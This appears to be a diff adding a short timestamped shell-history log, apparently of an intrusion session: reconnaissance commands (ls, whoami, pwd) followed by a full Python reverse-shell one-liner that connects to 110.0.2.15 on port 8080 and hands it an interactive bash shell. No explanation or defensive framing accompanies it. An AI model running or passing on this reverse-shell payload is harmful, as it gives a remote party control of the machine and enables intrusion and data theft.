@@ -1,0 +1,8 @@
+2025-01-22 22:09:03 - ls
+2025-01-22 22:09:06 - whoami
+2025-01-22 22:09:12 - pwd
+2025-01-22 22:09:19 - ls
+2025-01-22 22:09:27 - ls
+2025-01-22 22:09:49 - python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("110.0.2.15",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
+2025-01-22 22:09:52 - 
+2025-01-22 22:09:53 - 
